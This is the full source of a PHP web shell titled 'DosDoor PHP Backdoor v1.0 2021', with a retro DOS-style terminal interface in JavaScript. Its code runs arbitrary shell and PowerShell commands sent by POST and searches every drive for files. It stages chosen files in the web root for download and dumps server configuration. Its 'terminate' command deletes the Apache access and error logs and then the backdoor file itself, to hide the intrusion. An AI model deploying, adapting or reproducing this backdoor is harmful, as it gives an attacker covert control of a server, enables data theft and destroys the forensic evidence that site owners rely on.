<?php
function explodeX(array $delimiters, string $string)
{
  return  explode(chr(1), str_replace($delimiters, chr(1), $string))[1] ?? false;
}
function parse_phpinfo()
{
  ob_start();
  phpinfo(INFO_MODULES);
  $s = ob_get_contents();
  ob_end_clean();
  $s = strip_tags($s, '<h2><th><td>');
  $s = preg_replace('/<th[^>]*>([^<]+)<\/th>/', '<info>\1</info>', $s);
  $s = preg_replace('/<td[^>]*>([^<]+)<\/td>/', '<info>\1</info>', $s);
  $t = preg_split('/(<h2[^>]*>[^<]+<\/h2>)/', $s, -1, PREG_SPLIT_DELIM_CAPTURE);
  $r = array();
  $count = count($t);
  $p1 = '<info>([^<]+)<\/info>';
  $p2 = '/' . $p1 . '\s*' . $p1 . '\s*' . $p1 . '/';
  $p3 = '/' . $p1 . '\s*' . $p1 . '/';
  for ($i = 1; $i < $count; $i++) {
    if (preg_match('/<h2[^>]*>([^<]+)<\/h2>/', $t[$i], $matchs)) {
      $name = trim($matchs[1]);
      $vals = explode("\n", $t[$i + 1]);
      foreach ($vals as $val) {
        if (preg_match($p2, $val, $matchs)) { // 3cols
          $r[$name][trim($matchs[1])] = array(trim($matchs[2]), trim($matchs[3]));
        } elseif (preg_match($p3, $val, $matchs)) { // 2cols
          $r[$name][trim($matchs[1])] = trim($matchs[2]);
        }
      }
    }
  }
  return $r;
}
function selectCmdF()
{
  if (function_exists('shell_exec')) {
    $f = 'shell_exec';
  } else if (function_exists('system')) {
    $f = 'system';
  } else if (function_exists('passthru')) {
    $f = 'passthru';
  } else if (function_exists('exec')) {
    $f = 'exec';
  } else  $f = '';
  return  $f;
}

if (function_exists('phpinfo')) {
  $phpInfo = parse_phpinfo();
  $displayInfo = [
    $phpInfo["apache2handler"]["Virtual Server"],
    $phpInfo["apache2handler"]["Server Root"],
    $phpInfo["Apache Environment"]["WINDIR"],
    $phpInfo["Apache Environment"]["PATHEXT"],
    $phpInfo["Apache Environment"]["SERVER_SOFTWARE"],
    $phpInfo["Apache Environment"]["DOCUMENT_ROOT"],
    $phpInfo["Apache Environment"]["SCRIPT_NAME"],
    $phpInfo["Core"]["disable_functions"][1],
  ];
}
$cmdFucn = selectCmdF();

if (isset($_POST) && isset($_POST["cmd"])) {
  if (strstr($_POST["cmd"], '--d')) {

    $file = trim(explodeX(['--d'], $_POST["cmd"]));
    if (file_exists($file)) {
      $newFile = substr(str_shuffle('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'), 1, 5);
      if (copy($file, $newFile)) {
        echo "File ready for download, just go to /" . $newFile . " in current path";
      } else echo "Download Error";
    } else echo "File not found";
  } else if (strstr($_POST["cmd"], '--s')) {
    $arr = explode(",", 'A:,B:,C:,D:,E:,F:,G:,H:,I:,J:,K:,L:,M:,N:,O:,P:,Q:,R:,S:,T:,U:,V:,W:,X:,Y:,Z:');

    $search = trim(explodeX(['--s'], $_POST["cmd"]));
    $verbose = trim(explodeX(['--v'], $_POST["cmd"]));
    $ff = trim(explodeX(['--ff'], $_POST["cmd"]));

    $allResult = [];

    if ($ff) {
      $files = glob($ff, GLOB_BRACE);
      foreach ($files as $key => $file) {
        array_push($allResult, iconv("ISO-8859-1", "UTF-8", $file) . "\n");
      }
    } else {
      foreach ($arr as $value) {
        if (is_dir($value)) {
          $files = glob($value . "/{,*/,*/*/,*/*/*/}" . ($verbose != "" ? $verbose : $search), GLOB_BRACE);
          foreach ($files as $key => $file) {
            array_push($allResult, iconv("ISO-8859-1", "UTF-8", $file) . "\n");
          }
        }
      }
    }


    if (count($allResult) >= 150 && $verbose == "") {
      $newArr = array_splice($allResult, 0, 150);
      foreach ($newArr as $key => $value) {
        echo $value;
      }
      echo "Only the first 150 lines are shown. `--s -v {file or folder}` to see the whole result";
    } else {
      foreach ($allResult as $key => $value) {
        echo $value;
      }
    }
  } else if (strstr($_POST["cmd"], '--p')) {
    if ($cmdFucn == "") {
      echo "There is no function that can run a command";
      exit;
    } else {
      $powerShell = trim(explodeX(['--p'], $_POST["cmd"]));
      $cmd = $cmdFucn("powershell " . $powerShell);
      $clean_ascii_output = iconv("ISO-8859-1", "UTF-8", $cmd);
      if ($clean_ascii_output) {
        http_response_code(200);
        echo $clean_ascii_output;
      } else  http_response_code(400);
    }
  } else if (strstr($_POST["cmd"], '--info')) {
    if (!function_exists('phpinfo')) {
      echo "PHPInfo does not exist";
      exit;
    }
    ob_start();
    phpinfo();
    $info = ob_get_contents();
    ob_end_clean();

    $fp = fopen("phpinfo.html", "w+");
    fwrite($fp, $info);
    fclose($fp);
    echo "PHPInfo has been created go to `phpinfo.html` in current path";
  } else if (strstr($_POST["cmd"], '--t')) {
    if (isset($displayInfo[1])) {
      $confFiles = [];
      $files = glob($displayInfo[1] . "/{,*/,*/*/,*/*/*/}" . "httpd.conf", GLOB_BRACE);
      foreach ($files as $key => $file) {
        array_push($confFiles, iconv("ISO-8859-1", "UTF-8", $file));
      }
      foreach ($confFiles as $key => $value) {
        $lines = file($value);
        $config = [];

        foreach ($lines as $l) {
          preg_match("/^(?P<key>(\w| )+)\s+(?P<value>.*)/", $l, $matches);
          if (isset($matches['key']) && (trim($matches['key']) == "ErrorLog" || trim($matches['key']) == "CustomLog")) {
            $config[trim($matches['key'])] = trim($matches['value']);
          }
        }
        foreach ($config as $key => $value) {
          $logFile = explode(" ", $value)[0];
          $logFile = str_replace("\"", "", $logFile);
          if (strstr($logFile, ":")) {
            if (file_exists($logFile)) {
              $del = unlink($logFile);
              echo $del == true ? "$logFile deleted successfully \n" : "$logFile could not be deleted \n";
            } else {
              echo "$logFile not found, it may have been deleted before \n";
            }
          } else {
            $filePath = $displayInfo[1] . "/" . $logFile;
            if (file_exists($filePath)) {
              $del = unlink($filePath);
              echo $del == true ? "$filePath deleted successfully \n" : "$filePath could not be deleted \n";
            } else {
              echo "$filePath not found, it may have been deleted before \n";
            }
          }
        }
      }

      $cf = str_replace("/", "\\", $_SERVER["PHP_SELF"]);
      $cf1 = str_replace("/", "", $_SERVER["PHP_SELF"]);

      $backdoor = unlink(getcwd() . $cf);
      if (!$backdoor) unlink($cf1);
    }
  } else {
    if ($cmdFucn == "") {
      echo "There is no function that can run a command";
      exit;
    }
    $cmd = $cmdFucn($_POST["cmd"]);
    $clean_ascii_output = iconv("ISO-8859-1", "UTF-8", $cmd);
    if ($clean_ascii_output) {
      http_response_code(200);
      echo $clean_ascii_output;
    } else  http_response_code(400);
  }

  exit;
}
?>

<!DOCTYPE html>
<html>

<head>
  <meta charset="UTF-8">
  <title>DosDoor PHP Backdoor</title>
  <style>
    body,
    html {
      margin: 0px;
    }

    main {
      margin-top: 15px;
      background-color: #000;
      display: block;
      margin-left: auto;
      margin-right: auto;
      width: 1250px;
      height: 680px;
    }

    #mobileInput {
      position: absolute;
      top: -5px;
      left: -5px;
      width: 0px;
      height: 0px;
    }



    table {
      font-family: arial, sans-serif;
      border-collapse: collapse;
      width: 100%;

    }

    td,
    th {
      border: 1px solid #dddddd;
      text-align: left;
      padding: 8px;
    }

    tr:nth-child(even) {
      background-color: #dddddd;
    }
  </style>

<body>
  <main>
    <div style="width: 1250px; height:680px; overflow: scroll;">
      <canvas id="viewPort" width="1024" height="7680"></canvas>
      <input id="mobileInput" type="text">
    </div>
  </main>
  <div class="help-div">
    <table class="help-table">
      <tr>
        <td>`cls` clear console</td>
        <td style=" white-space:pre ">
          `--s {file or folder}` search on disk.
          Use `--v` to verbose mode `--s --v {file or folder}`.
          To search with full path `--s --ff {full path}`
        </td>
        <td>`--d {file}` download file </td>
        <td>`--t` terminate </td>
        <td>`--p {command}` powershell command</td>
        <td>`--info` dowloand phpinfo</td>
      </tr>
      <tr>
        <th colspan="6">
          Note: Terminate delete all access logs and current backdoor
        </th>
      </tr>
    </table>
  </div>
  <div class="help-div">
    <table class="help-table">
      <tr>
        <th>Virtual Server</th>
        <th>Server Root </th>
        <th>WINDIR </th>
        <th>PATHEXT </th>
        <th>SERVER SOFTWARE</th>
        <th>DOCUMENT ROOT</th>
        <th>SCRIPT NAME</th>
        <th>disable_functions</th>
      </tr>
      <tr>
        <td><?php echo $displayInfo[0] ?? "undefined"; ?></td>
        <td><?php echo $displayInfo[1] ?? "undefined"; ?></td>
        <td><?php echo $displayInfo[2] ?? "undefined"; ?></td>
        <td><?php echo $displayInfo[3] ?? "undefined"; ?></td>
        <td><?php echo $displayInfo[4] ?? "undefined"; ?></td>
        <td><?php echo $displayInfo[5] ?? "undefined"; ?></td>
        <td><?php echo $displayInfo[6] ?? "undefined"; ?></td>
        <td><?php echo $displayInfo[7] ?? "undefined"; ?></td>
      </tr>
    </table>
  </div>

  <script>
    var dostoy = function() {

      var charSet = [];
      var fontHeight = 0;

      var curX = 0;
      var curY = 0;

      var maxX = 0;
      var maxY = 0;

      var foregroundColor = 7;
      var backgroundColor = 0;

      var ctx = null;

      var cursor = true;
      var flipflop = true;

      var applicationInputHandler = null;
      var shellInputHandler = null;
      var singleKeyInputHandler = null;
      var singleKeyInputHandlerUsed = false;

      var shiftState = false;
      var inputBuffer = "";

      var prompt = ">";

      var shell = true;

      var ansiColors = [ // quickbasic order
        [0, 0, 0],
        [0, 0, 170],
        [0, 170, 0],
        [0, 170, 170],
        [170, 0, 0],
        [170, 0, 170],
        [170, 85, 0],
        [170, 170, 170],
        [85, 85, 85],
        [85, 85, 255],
        [85, 255, 85],
        [85, 255, 255],
        [255, 85, 85],
        [255, 85, 255],
        [255, 255, 85],
        [255, 255, 255]
      ];

      /**
       * index starts at the first printable keyCode (code 48, char "0")
       **/

      var baseChars = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
        "", "", "", "", "", "", "",
        "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
        "", "", "", "", "",
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "*", "+", "", "-", ".", "\/", // numpad
        "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "",
        "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "",
        "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "",
        "", "", "", "", "", "", "", "", "", "", "", "", "", "",
        ";", "=", ",", "-", ".", "/", "`",
        "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "",
        "", "", "", "", "", "",
        "[", "\\", "]", "'"
      ];

      var shiftChars = [")", "!", "@", "#", "$", "%", "^", "&", "*", "(",
        "", "", "", "", "", "", "",
        "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z",
        "", "", "", "", "",
        "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", // numpad
        "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "",
        "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "",
        "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "",
        "", "", "", "", "", "", "", "", "", "", "", "", "", "",
        ":", "+", "<", "_", ">", "?", "~",
        "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "",
        "", "", "", "", "", "",
        "{", "|", "}", "\""
      ];

      var byte2bits = function(a) {
        var tmp = "";
        for (var i = 128; i >= 1; i /= 2)
          tmp += a & i ? '1' : '0';
        return tmp;
      }

      var initCharSet = function(font, width) {

        var fontBuffer = null;

        if (typeof font == "Uint8Array") {

          fontBuffer = font;

        } else {

          var rawLength = font.length;

          fontBuffer = new Uint8Array(new ArrayBuffer(rawLength));
          for (i = 0; i < rawLength; i++) {
            fontBuffer[i] = font.charCodeAt(i);
          }
        }

        for (var x = 0; x < fontBuffer.length / width; x++) {
          var charI = ctx.createImageData(8, width);
          for (var i = 0; i < width; i++) {
            var bitString = byte2bits(fontBuffer[(x * width) + i]);
            for (var j = 0; j < 8; j++) {
              charI.data[((i * 8) + j) * 4 + 0] = bitString[j] == "1" ? 255 : 0;
              charI.data[((i * 8) + j) * 4 + 1] = bitString[j] == "1" ? 255 : 0;
              charI.data[((i * 8) + j) * 4 + 2] = bitString[j] == "1" ? 255 : 0;
              charI.data[((i * 8) + j) * 4 + 3] = 255;
            }
          }
          charSet.push(charI);
        }

      }


      var onCommand = function(inputBuffer) {
        if (applicationInputHandler) {
          applicationInputHandler(inputBuffer);
        } else {
          shellInputHandler(inputBuffer);
        }

      }

      var cls = function() {
        curX = 0;
        curY = 0;
        ctx.rect(0, 0, ctx.canvas.width, ctx.canvas.height);
        ctx.fillStyle = "rgba(" + ansiColors[backgroundColor][0] + "," + ansiColors[backgroundColor][1] + "," + ansiColors[backgroundColor][2] + ",1)";
        ctx.fill();

      }
      var initCanvas = function(canvas) {
        ctx = canvas.getContext("2d");
        cls();
      }

      var chr = function(code) {
        var codes = code.split(",");
        var out = "";
        for (var i = 0, icode; icode = codes[i]; i++)
          out += String.fromCharCode(icode);

        return out;
      }

      var newLine = function() {
        cursorBlink(false);
        if (curY + 1 > maxY) {
          ctx.putImageData(ctx.getImageData(0, fontHeight, ctx.canvas.width, ctx.canvas.height - fontHeight), 0, 0);
          ctx.rect(0, maxY * fontHeight, ctx.canvas.width, fontHeight);
          ctx.fillStyle = "rgba(0,0,0,1)";
          ctx.fill();

          curX = 0;

        } else {
          curY++;
          curX = 0;
        }
      }

      var doPrompt = function() {
        if (prompt && shell)
          print(prompt);
      }

      var print = function(text) {
        text = text.toString().replace(/\t/g, "       ");
        var startXReal = curX * 8;
        var startYReal = curY * fontHeight;

        for (var i = 0; i < Math.min(text.length, maxX); i++) {

          var charImage = charSet[text.charCodeAt(i)];

          if (backgroundColor != 0 || foregroundColor != 15) {

            var colorizedCharImage = ctx.createImageData(8, fontHeight);

            for (var j = 0; j < colorizedCharImage.data.length; j += 4) {
              colorizedCharImage.data[j] = charImage.data[j] !== 255 ? ansiColors[backgroundColor][0] : ansiColors[foregroundColor][0];
              colorizedCharImage.data[j + 1] = charImage.data[j + 1] !== 255 ? ansiColors[backgroundColor][1] : ansiColors[foregroundColor][1];
              colorizedCharImage.data[j + 2] = charImage.data[j + 2] !== 255 ? ansiColors[backgroundColor][2] : ansiColors[foregroundColor][2];
              colorizedCharImage.data[j + 3] = 255;
            }

            ctx.putImageData(colorizedCharImage, startXReal + (i * 8), startYReal);
          } else {
            ctx.putImageData(charImage, startXReal + (i * 8), startYReal);
          }

          curX++;
        }
      }

      var color = function(bg, fg) {
        backgroundColor = bg;
        foregroundColor = fg;
      }

      var println = function(text) {
        if (text)
          print(text);
        newLine();
      }

      var cursorBlink = function(forceState) {
        if (cursor) {
          var XReal = curX * 8;
          var YReal = curY * fontHeight;
          if (typeof forceState != "undefined") flipflop = forceState;

          if (flipflop) {
            ctx.strokeStyle = "rgba(255,255,255,1)";
            ctx.beginPath();
            ctx.lineWidth = 2;
            ctx.moveTo(XReal, YReal + 13);
            ctx.lineTo(XReal + 8, YReal + 13);
            ctx.stroke();

            flipflop = false;

          } else {
            ctx.strokeStyle = "rgba(0,0,0,1)";
            ctx.beginPath();
            ctx.lineWidth = 2;
            ctx.moveTo(XReal, YReal + 13);
            ctx.lineTo(XReal + 80, YReal + 13); // ugly hack to clear any cursor remnants
            ctx.stroke();

            flipflop = true;
          }

        }
      }

      var initInput = function(inputSource) {
        inputSource.addEventListener("keydown", function(evt) {

          if (singleKeyInputHandler) {
            singleKeyInputHandlerUsed = true;
            singleKeyInputHandler(evt.keyCode);
            if (singleKeyInputHandlerUsed) {
              singleKeyInputHandler = null;
              singleKeyInputHandlerUsed = false;
            }

            return;
          }

          if (!shell) return;
          evt.preventDefault();

          var char;

          if (evt.keyCode >= 48) {

            if (evt.shiftKey)
              char = shiftChars[evt.keyCode - 48];

            else
              char = baseChars[evt.keyCode - 48];

          } else {

            switch (evt.keyCode) {
              case 8: // backspace
                if (curX > prompt.length) {
                  curX--;
                  print(" ");
                  curX--;
                  cursorBlink();
                  inputBuffer = inputBuffer.substring(0, inputBuffer.length - 1);
                  char = "";
                }
                break;
              case 13: //enter

                newLine();
                if (inputBuffer.length > 0) {
                  onCommand(inputBuffer);
                }

                inputBuffer = "";


                if (shellInputHandler && !applicationInputHandler && !singleKeyInputHandlerUsed) doPrompt();

                break;
              case 32: // space
                char = " ";
                break;
            }
          }


          if (char) {
            print(char);
            inputBuffer += char;
          }

        });

      }

      var setPrompt = function(newPrompt) {
        prompt = newPrompt;
      }

      var setCursor = function(state) {
        cursor = state;
      }

      var init = function(config) {
        if (!config.font) throw "font missing from config";
        if (!config.fontHeight) throw "fontHeight missing from config";
        if (!config.canvas) throw "canvas missing from config";

        initCanvas(config.canvas);

        initCharSet(config.font, config.fontHeight);
        fontHeight = config.fontHeight;

        (config.lines) ? maxY = config.lines: maxY = Math.floor(ctx.canvas.height / fontHeight) - 1;
        (config.columns) ? maxX = config.columns: maxX = Math.floor(ctx.canvas.width / 8) - 1;


        initInput(config.inputSource ? config.inputSourse : document);

        if (config.shell) {

          if (config.commandHandler) shellInputHandler = config.commandHandler;

          if (config.prompt) {
            setPrompt(config.prompt);
          }

          if (config.beforeShell) {
            config.beforeShell();
          }

          doPrompt();

        } else {
          cursor = false;
        }
        shell = config.shell;
        window.setInterval(cursorBlink, 500);

      }

      var input = function(inputPrompt, resultHandler) {

        applicationInputHandler =
          function(oldPrompt) {
            return function(value) {
              shell = false;
              setPrompt(oldPrompt);
              applicationInputHandler = null;
              resultHandler(value);
              if (shellInputHandler)
                shell = true;
            }
          }(prompt);

        shell = true;
        setPrompt(inputPrompt);

        doPrompt();

      }

      var inkey = function(resultHandler) {
        singleKeyInputHandler = resultHandler;
        singleKeyInputHandlerUsed = false;
      }

      var locate = function(col, row) {
        if (col >= 0)
          curX = col < maxX ? col : 0;
        if (row >= 0)
          curY = row < maxY ? row : 0;
      }

      var setShell = function(value) {
        if (value) {
          shell = true;
          dostoy.color(0, 7);
          if (singleKeyInputHandlerUsed)
            doPrompt();
        } else {
          shell = false;
        }

      }

      return {
        init: init,
        print: print,
        println: println,
        input: input,
        inkey: inkey,
        locate: locate,
        cls: cls,
        chr: chr,
        color: color,
        setPrompt: setPrompt,
        setCursor: setCursor,
        setShell: setShell,
        getCols: function() {
          return maxX;
        },
        getRows: function() {
          return maxY;
        }

      }

    }();
  </script>
  <script>
    var repeat = function(text, num) {
      return new Array(num + 1).join(text);
    }

    window.onload = function() {

      dostoy.init({
        font: window.atob("AAAAAAAAAAAAAAAAAAAAAH6BpYGBvZmBfgAAAAAAfv/b///D5/9+AAAAAAAAbP7+/v58OBAAAAAAAAAQOHz+fDgQAAAAAAAAGDw85+fnGBg8AAAAAAAYPH7//34YGDwAAAAAAAAAABg8PBgAAAAAAP//////58PD5///////AAAAADxmQkJmPAAAAAD/////w5m9vZnD/////wAAHg4aMnjMzMx4AAAAAAA8ZmZmPBh+GBgAAAAAAD8zPzAwMHDw4AAAAAAAf2N/Y2NjZ+fmwAAAAAAYGNs85zzbGBgAAAAAAIDA4Pj++ODAgAAAAAAAAgYOPv4+DgYCAAAAAAAYPH4YGBh+PBgAAAAAAGZmZmZmZgBmZgAAAAAAf9vb23sbGxsbAAAAAHzGYDhsxsZsOAzGfAAAAAAAAAAAAP7+/gAAAAAAGDx+GBgYfjwYfgAAAAAYPH4YGBgYGBgAAAAAABgYGBgYGH48GAAAAAAAAAAYDP4MGAAAAAAAAAAAADBg/mAwAAAAAAAAAAAAAMDAwP4AAAAAAAAAAAAobP5sKAAAAAAAAAAAEDg4fHz+/gAAAAAAAAD+/nx8ODgQAAAAAAAAAAAAAAAAAAAAAAAAAAAYPDw8GBgAGBgAAAAAZmZmJAAAAAAAAAAAAAAAbGz+bGxs/mxsAAAAGBh8xsLAfAaGxnwYGAAAAAAAwsYMGDBmxgAAAAAAOGxsOHbczMx2AAAAADAwMGAAAAAAAAAAAAAAAAwYMDAwMDAYDAAAAAAAMBgMDAwMDBgwAAAAAAAAAGY8/zxmAAAAAAAAAAAAGBh+GBgAAAAAAAAAAAAAAAAAGBgYMAAAAAAAAAAA/gAAAAAAAAAAAAAAAAAAAAAYGAAAAAAAAgYMGDBgwIAAAAAAAAB8xs7e9ubGxnwAAAAAABg4eBgYGBgYfgAAAAAAfMYGDBgwYMb+AAAAAAB8xgYGPAYGxnwAAAAAAAwcPGzM/gwMHgAAAAAA/sDAwPwGBsZ8AAAAAAA4YMDA/MbGxnwAAAAAAP7GBgwYMDAwMAAAAAAAfMbGxnzGxsZ8AAAAAAB8xsbGfgYGDHgAAAAAAAAYGAAAABgYAAAAAAAAABgYAAAAGBgwAAAAAAAGDBgwYDAYDAYAAAAAAAAAAH4AAH4AAAAAAAAAYDAYDAYMGDBgAAAAAAB8xsYMGBgAGBgAAAAAAHzGxt7e3tzAfAAAAAAAEDhsxsb+xsbGAAAAAAD8ZmZmfGZmZvwAAAAAADxmwsDAwMJmPAAAAAAA+GxmZmZmZmz4AAAAAAD+ZmJoeGhiZv4AAAAAAP5mYmh4aGBg8AAAAAAAPGbCwMDexmY6AAAAAADGxsbG/sbGxsYAAAAAADwYGBgYGBgYPAAAAAAAHgwMDAwMzMx4AAAAAADmZmxseGxsZuYAAAAAAPBgYGBgYGJm/gAAAAAAxu7+/tbGxsbGAAAAAADG5vb+3s7GxsYAAAAAADhsxsbGxsZsOAAAAAAA/GZmZnxgYGDwAAAAAAB8xsbGxtbefAwOAAAAAPxmZmZ8bGZm5gAAAAAAfMbGYDgMxsZ8AAAAAAB+floYGBgYGDwAAAAAAMbGxsbGxsbGfAAAAAAAxsbGxsbGbDgQAAAAAADGxsbG1tb+fGwAAAAAAMbGbDg4OGzGxgAAAAAAZmZmZjwYGBg8AAAAAAD+xowYMGDCxv4AAAAAADwwMDAwMDAwPAAAAAAAgMDgcDgcDgYCAAAAAAA8DAwMDAwMDDwAAAAQOGzGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP8AMDAYAAAAAAAAAAAAAAAAAAAAAHgMfMzMdgAAAAAA4GBgeGxmZmZ8AAAAAAAAAAB8xsDAxnwAAAAAABwMDDxszMzMdgAAAAAAAAAAfMb+wMZ8AAAAAAA4bGRg8GBgYPAAAAAAAAAAAHbMzMx8DMx4AAAA4GBgbHZmZmbmAAAAAAAYGAA4GBgYGDwAAAAAAAYGAA4GBgYGZmY8AAAA4GBgZmx4bGbmAAAAAAA4GBgYGBgYGDwAAAAAAAAAAOz+1tbWxgAAAAAAAAAA3GZmZmZmAAAAAAAAAAB8xsbGxnwAAAAAAAAAANxmZmZ8YGDwAAAAAAAAdszMzHwMDB4AAAAAAADcdmZgYPAAAAAAAAAAAHzGcBzGfAAAAAAAEDAw/DAwMDYcAAAAAAAAAADMzMzMzHYAAAAAAAAAAGZmZmY8GAAAAAAAAAAAxsbW1v5sAAAAAAAAAADGbDg4bMYAAAAAAAAAAMbGxsZ+Bgz4AAAAAAAA/swYMGb+AAAAAAAOGBgYcBgYGA4AAAAAABgYGBgAGBgYGAAAAAAAcBgYGA4YGBhwAAAAAAB23AAAAAAAAAAAAAAAAAAAEDhsxsb+AAAAAAAAPGbCwMDCZjwMBnwAAADMzADMzMzMzHYAAAAADBgwAHzG/sDGfAAAAAAQOGwAeAx8zMx2AAAAAADMzAB4DHzMzHYAAAAAYDAYAHgMfMzMdgAAAAA4bDgAeAx8zMx2AAAAAAAAADxmYGY8DAY8AAAAEDhsAHzG/sDGfAAAAAAAzMwAfMb+wMZ8AAAAAGAwGAB8xv7AxnwAAAAAAGZmADgYGBgYPAAAAAAYPGYAOBgYGBg8AAAAAGAwGAA4GBgYGDwAAAAAxsYQOGzGxv7GxgAAADhsOAA4bMbG/sbGAAAAGDBgAP5mYHxgZv4AAAAAAAAAzHY2ftjYbgAAAAAAPmzMzP7MzMzOAAAAABA4bAB8xsbGxnwAAAAAAMbGAHzGxsbGfAAAAABgMBgAfMbGxsZ8AAAAADB4zADMzMzMzHYAAAAAYDAYAMzMzMzMdgAAAAAAxsYAxsbGxn4GDHgAAMbGOGzGxsbGbDgAAAAAxsYAxsbGxsbGfAAAAAAYGDxmYGBmPBgYAAAAADhsZGDwYGBg5vwAAAAAAGZmPBh+GH4YGAAAAAD4zMz4xMzezMzGAAAAAA4bGBgYfhgYGBjYcAAAGDBgAHgMfMzMdgAAAAAMGDAAOBgYGBg8AAAAABgwYAB8xsbGxnwAAAAAGDBgAMzMzMzMdgAAAAAAdtwA3GZmZmZmAAAAdtwAxub2/t7OxsYAAAAAPGxsPgB+AAAAAAAAAAA4bGw4AHwAAAAAAAAAAAAwMAAwMGDGxnwAAAAAAAAAAAD+wMDAAAAAAAAAAAAAAP4GBgYAAAAAAMDAxszYMGDchgwYPgAAwMDGzNgwZs6ePgYGAAAAGBgAGBg8PDwYAAAAAAAAADZs2Gw2AAAAAAAAAAAA2Gw2bNgAAAAAABFEEUQRRBFEEUQRRBFEVapVqlWqVapVqlWqVardd9133Xfdd9133XfddxgYGBgYGBgYGBgYGBgYGBgYGBgYGPgYGBgYGBgYGBgYGPgY+BgYGBgYGDY2NjY2Njb2NjY2NjY2AAAAAAAAAP42NjY2NjYAAAAAAPgY+BgYGBgYGDY2NjY29gb2NjY2NjY2NjY2NjY2NjY2NjY2NjYAAAAAAP4G9jY2NjY2NjY2NjY29gb+AAAAAAAANjY2NjY2Nv4AAAAAAAAYGBgYGPgY+AAAAAAAAAAAAAAAAAD4GBgYGBgYGBgYGBgYGB8AAAAAAAAYGBgYGBgY/wAAAAAAAAAAAAAAAAD/GBgYGBgYGBgYGBgYGB8YGBgYGBgAAAAAAAAA/wAAAAAAABgYGBgYGBj/GBgYGBgYGBgYGBgfGB8YGBgYGBg2NjY2NjY2NzY2NjY2NjY2NjY2NzA/AAAAAAAAAAAAAAA/MDc2NjY2NjY2NjY2NvcA/wAAAAAAAAAAAAAA/wD3NjY2NjY2NjY2NjY3MDc2NjY2NjYAAAAAAP8A/wAAAAAAADY2NjY29wD3NjY2NjY2GBgYGBj/AP8AAAAAAAA2NjY2NjY2/wAAAAAAAAAAAAAA/wD/GBgYGBgYAAAAAAAAAP82NjY2NjY2NjY2NjY2PwAAAAAAABgYGBgYHxgfAAAAAAAAAAAAAAAfGB8YGBgYGBgAAAAAAAAAPzY2NjY2NjY2NjY2Njb/NjY2NjY2GBgYGBj/GP8YGBgYGBgYGBgYGBgY+AAAAAAAAAAAAAAAAAAfGBgYGBgY//////////////////8AAAAAAAAA//////////Dw8PDw8PDw8PDw8PDwDw8PDw8PDw8PDw8PDw//////////AAAAAAAAAAAAAAAAdtzY2Nx2AAAAAAAAAHzG/MbG/MDAQAAAAP7GxsDAwMDAwAAAAAAAAAD+bGxsbGxsAAAAAAD+xmAwGDBgxv4AAAAAAAAAAH7Y2NjYcAAAAAAAAABmZmZmfGBgwAAAAAAAAHbcGBgYGBgAAAAAAH4YPGZmZjwYfgAAAAAAOGzGxv7Gxmw4AAAAAAA4bMbGxmxsbO4AAAAAAB4wGAw+ZmZmPAAAAAAAAAAAftvbfgAAAAAAAAADBn7b2/N+YMAAAAAAABwwYGB8YGAwHAAAAAAAAHzGxsbGxsbGAAAAAAAA/gAA/gAA/gAAAAAAAAAYGH4YGAAA/wAAAAAAMBgMBgwYMAB+AAAAAAAMGDBgMBgMAH4AAAAAAA4bGxgYGBgYGBgYGBgYGBgYGBgY2NhwAAAAAAAAGBgAfgAYGAAAAAAAAAAAdtwAdtwAAAAAAAA4bGw4AAAAAAAAAAAAAAAAAAAAGBgAAAAAAAAAAAAAAAAAGAAAAAAAAAAPDAwMDAzsbDwcAAAAANhsbGxsbAAAAAAAAAAAcNgwYMj4AAAAAAAAAAAAAAB8fHx8fHwAAAAAAAAAAAAAAAAAAAAAAAA="),
        fontHeight: 14,
        canvas: document.getElementById("viewPort"),
        shell: true,
        beforeShell: function() {
          dostoy.color(6, 15);
          dostoy.println(dostoy.chr("201" + repeat(",205", 34) + ",187"));
          dostoy.println(dostoy.chr("186") + "  DosDoor Php Backdoor v1.0 2021  " + dostoy.chr("186"))
          dostoy.println(dostoy.chr("200" + repeat(",205", 34) + ",188"));
          dostoy.color(0, 7);
          dostoy.println();
        },
        prompt: "DosDoor:\\>",
        commandHandler: function(command) {
          var data = new FormData();
          data.append('cmd', command);
          var xhttp = new XMLHttpRequest();
          xhttp.onreadystatechange = function() {
            if (this.readyState == 1) {
              dostoy.color(0, 2);
              dostoy.println("Command executed please wait");
              dostoy.color(0, 7);
            }
            if (this.readyState == 4 && this.status == 200) {
              const myArr = this.responseText.split("\n");
              var filtered = myArr.filter(function(el) {
                return el != null;
              });
              console.log(filtered)
              if (filtered.length >= 1) {
                console.log(filtered)
                dostoy.println();
                filtered.forEach(element => {
                  dostoy.println(element);
                });
              }
            } else if (this.readyState == 4 && this.status == 400) {
              dostoy.color(0, 4);
              dostoy.print("No result");
              dostoy.color(0, 7);
            }
          };
          xhttp.open("POST", "", true);
          xhttp.send(data);

          switch (command) {
            case "cls":
              dostoy.cls();
              break;
          }

        },
      });
    };
    window.onunload = function() {
      location.reload();
    }

    document.getElementById("viewPort").addEventListener("click", function(evt) {
      document.getElementById("mobileInput").focus();
    });
  </script>
</body>

</html>